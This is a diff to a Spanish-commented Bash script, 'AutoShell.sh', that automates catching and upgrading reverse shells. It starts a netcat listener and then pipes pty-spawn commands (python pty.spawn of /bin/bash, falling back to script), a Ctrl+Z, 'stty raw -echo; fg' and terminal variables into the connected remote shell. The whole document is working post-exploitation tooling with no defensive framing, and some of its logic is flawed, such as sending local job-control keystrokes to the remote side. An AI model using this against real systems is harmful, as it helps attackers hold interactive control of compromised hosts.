@@ -1,20 +1,15 @@
 #!/usr/bin/env bash
 
-# Ultimate Reverse Shell Upgrader (v2.0) - Modificado sin log
-# Features:
-# - Parámetros interactivos si no se especifican
-# - Orden IP primero, puerto después
-# - Validación de entrada robusta
-# - Eliminado el log a archivo
+# AutoShell.sh - Estabilizador 100% Automático de Reverse Shells
+# Versión: 3.0
 
-set -eo pipefail
+set -e
 IFS=$'\n\t'
 
 # Configuración por defecto
 DEFAULT_IP="0.0.0.0"
 DEFAULT_PORT="4444"
-TIMEOUT=15
-NC_CMD=""
+TIMEOUT=30
 
 # Colores
 RED='\033[0;31m'
@@ -30,8 +25,7 @@ show_help() {
     echo "  $0 (sin parámetros para modo interactivo)"
     echo -e "\n${BLUE}Ejemplos:${NC}"
     echo "  $0 192.168.1.10 4444"
-    echo "  $0 ::1 8080"
-    echo "  $0 (modo interactivo)"
+    echo "  $0 0.0.0.0 8080"
     exit 0
 }
 
@@ -39,8 +33,9 @@ show_help() {
 cleanup() {
     echo -e "\n${YELLOW}[*] Limpiando...${NC}"
     [[ -p "/tmp/input" ]] && rm -f /tmp/input
+    [[ -p "/tmp/output" ]] && rm -f /tmp/output
     [[ -n $NC_PID ]] && kill -9 $NC_PID 2>/dev/null
-    stty sane
+    stty sane 2>/dev/null || true
     exit 0
 }
 
@@ -56,10 +51,10 @@ validate_ip() {
         stat=$?
     elif [[ $ip =~ ^[0-9a-fA-F:]+$ ]]; then # IPv6
         stat=0
-    elif [[ $ip == "localhost" ]]; then
+    elif [[ $ip == "localhost" || $ip == "0.0.0.0" ]]; then
         stat=0
     fi
-    
+
     return $stat
 }
 
@@ -73,7 +68,7 @@ validate_port() {
 # Preguntas interactivas
 ask_parameters() {
     echo -e "${BLUE}[*] Modo interactivo${NC}"
-    
+
     while :; do
         read -p "Introduce IP [${DEFAULT_IP}]: " ip
         ip=${ip:-$DEFAULT_IP}
@@ -83,7 +78,7 @@ ask_parameters() {
             echo -e "${RED}[!] IP no válida${NC}"
         fi
     done
-    
+
     while :; do
         read -p "Introduce puerto [${DEFAULT_PORT}]: " port
         port=${port:-$DEFAULT_PORT}
@@ -93,7 +88,7 @@ ask_parameters() {
             echo -e "${RED}[!] Puerto no válido (1-65535)${NC}"
         fi
     done
-    
+
     LISTEN_IP=$ip
     PORT=$port
 }
@@ -101,19 +96,9 @@ ask_parameters() {
 # Verificación de dependencias
 check_deps() {
     local missing=()
+    local cmds=("nc" "mkfifo" "stty")
     
-    # Detectar netcat
-    if command -v nc &>/dev/null; then
-        NC_CMD="nc"
-    elif command -v netcat &>/dev/null; then
-        NC_CMD="netcat"
-    else
-        missing+=("netcat")
-    fi
-    
-    # Otras dependencias
-    local commands=("bash" "stty" "ps" "mkfifo")
-    for cmd in "${commands[@]}"; do
+    for cmd in "${cmds[@]}"; do
         if ! command -v $cmd &>/dev/null; then
             missing+=("$cmd")
         fi
@@ -126,24 +111,39 @@ check_deps() {
     fi
 }
 
-# Mejorar la shell
-upgrade_shell() {
-    {
-        # Intentar con Python 3, Python 2, o script como fallback
-        echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null 2>/dev/null"
-        sleep 1
-        
-        # Configurar terminal
-        echo "stty rows $(tput lines) cols $(tput cols) 2>/dev/null"
-        echo "export TERM=xterm-256color"
-        echo "alias ls='ls --color=auto' 2>/dev/null"
-        echo "reset 2>/dev/null"
-        printf "\n"
-    } > /tmp/input
+# Detectar la variante de netcat disponible
+detect_nc_variant() {
+    local nc_help
+    nc_help=$(nc -h 2>&1 || nc --help 2>&1 || netcat -h 2>&1 || netcat --help 2>&1)
+    
+    if echo "$nc_help" | grep -q "\-e"; then
+        # Variante con soporte para -e (tradicional)
+        NC_LISTENER="nc -lvp $PORT"
+        [[ "$LISTEN_IP" != "0.0.0.0" ]] && NC_LISTENER="$NC_LISTENER -s $LISTEN_IP"
+    elif echo "$nc_help" | grep -q "\-c"; then
+        # Variante con soporte para -c (ncat)
+        NC_LISTENER="nc -lvnp $PORT"
+        [[ "$LISTEN_IP" != "0.0.0.0" ]] && NC_LISTENER="$NC_LISTENER --source $LISTEN_IP"
+    else
+        # Variante OpenBSD/Debian
+        NC_LISTENER="nc -lvnp $PORT"
+        [[ "$LISTEN_IP" != "0.0.0.0" ]] && NC_LISTENER="$NC_LISTENER -s $LISTEN_IP"
+    fi
+}
+
+# Detectar altura y anchura del terminal
+get_terminal_size() {
+    if command -v stty &>/dev/null; then
+        TERM_ROWS=$(stty size 2>/dev/null | awk '{print $1}')
+        TERM_COLS=$(stty size 2>/dev/null | awk '{print $2}')
+    else
+        TERM_ROWS=24
+        TERM_COLS=80
+    fi
 }
 
 # Main
-trap cleanup SIGINT SIGTERM
+trap cleanup SIGINT SIGTERM EXIT
 
 # Procesar argumentos
 if [[ "$1" == "-h" || "$1" == "--help" ]]; then
@@ -154,6 +154,9 @@ if [[ $# -eq 2 ]]; then
     if validate_ip "$1" && validate_port "$2"; then
         LISTEN_IP=$1
         PORT=$2
+        echo -e "${GREEN}[+] Parámetros validados:${NC}"
+        echo -e "    - IP: $LISTEN_IP"
+        echo -e "    - Puerto: $PORT"
     else
         echo -e "${RED}[!] Argumentos no válidos${NC}"
         show_help
@@ -166,55 +169,56 @@ else
 fi
 
 check_deps
+detect_nc_variant
+get_terminal_size
 
-# Crear FIFO
-if ! mkfifo /tmp/input 2>/dev/null; then
-    echo -e "${RED}[!] Error al crear FIFO en /tmp/input${NC}"
-    echo -e "${YELLOW}[*] Intenta eliminar manualmente: rm -f /tmp/input${NC}"
-    exit 1
-fi
+# Crear FIFO para comunicación bidireccional
+rm -f /tmp/input /tmp/output 2>/dev/null || true
+mkfifo /tmp/input /tmp/output
 
-# Configurar netcat
-echo -e "${GREEN}[*] Iniciando listener en ${LISTEN_IP}:${PORT}${NC}"
-echo -e "${YELLOW}[*] Usa Ctrl+C para salir${NC}"
+# Iniciar listener
+echo -e "${YELLOW}[*] Iniciando listener en ${LISTEN_IP}:${PORT}${NC}"
 
-# Detectar argumentos correctos para netcat
-case $($NC_CMD -h 2>&1) in
-    *"OpenBSD"*|*"Debian"*)
-        NC_ARGS="-lvnp $PORT -s $LISTEN_IP" ;;
-    *)
-        NC_ARGS="-l -v -n -p $PORT -s $LISTEN_IP" ;;
-esac
-
-# Lanzar netcat sin redirigir salida a un log
-$NC_CMD $NC_ARGS < /tmp/input > /dev/null 2>&1 &
+# Ejecutar netcat con redirección de entrada/salida
+( $NC_LISTENER < /tmp/input > /tmp/output 2>&1 ) &
 NC_PID=$!
 
-# Timeout para verificar que netcat siga en ejecución
-{
-    sleep $TIMEOUT
-    if ! ps -p $NC_PID > /dev/null; then
-        echo -e "${RED}[!] Tiempo de espera agotado sin conexiones${NC}"
-        cleanup
+# Monitorear la conexión
+echo -e "${YELLOW}[*] Esperando conexión...${NC}"
+
+# Leer la salida de netcat y buscar conexión
+while IFS= read -r line || [[ -n "$line" ]]; do
+    echo "$line"
+    if [[ "$line" == *"connect"* || "$line" == *"Connection from"* || "$line" == *"Conexión"* ]]; then
+        echo -e "${GREEN}[+] Conexión establecida${NC}"
+        echo -e "${YELLOW}[*] Mejorando shell...${NC}"
+        break
     fi
-} &
+done < <(cat /tmp/output & PID=$!; sleep $TIMEOUT; kill $PID 2>/dev/null)
 
-# Esperar conexión mediante tiempo fijo (sin leer log)
-echo -e "${YELLOW}[*] Esperando conexión (espera fija de 10 segundos)${NC}"
-sleep 10
+# Enviar comandos para mejorar la shell
+{
+    echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || /usr/bin/script -qc /bin/bash /dev/null"
+    sleep 1
+    # Ctrl+Z
+    echo -e "\x1A"
+    sleep 1
+    # Configurar terminal
+    echo "stty raw -echo ; fg"
+    sleep 1
+    echo ""
+    sleep 1
+    # Configurar variables
+    echo "reset"
+    sleep 1
+    echo "export SHELL=bash"
+    echo "export TERM=xterm-256color"
+    echo "stty rows $TERM_ROWS cols $TERM_COLS"
+    echo "clear"
+    # Mensaje de éxito
+    echo "echo -e '\033[0;32m[+] Shell mejorada con éxito!\033[0m # ¡Shell interactiva lista!'"
+} > /tmp/input
 
-echo -e "${GREEN}[+] Asumiendo que la conexión fue establecida (o en espera activa)...${NC}"
-echo -e "${YELLOW}[*] Mejorando shell...${NC}"
-
-upgrade_shell
-
-echo -e "${GREEN}[+] Shell mejorada con éxito!${NC}"
-echo -e "${YELLOW}[*] Usa 'reset' si hay problemas de terminal al salir${NC}"
-
-# Intentar pasar la sesión al primer plano, si es aplicable
-if ! fg >/dev/null 2>&1; then
-    echo -e "${RED}[!] Error al traer a primer plano${NC}"
-    cleanup
-fi
-
-cleanup
+# Mantener el script en ejecución
+cat /tmp/output &
+cat > /tmp/input
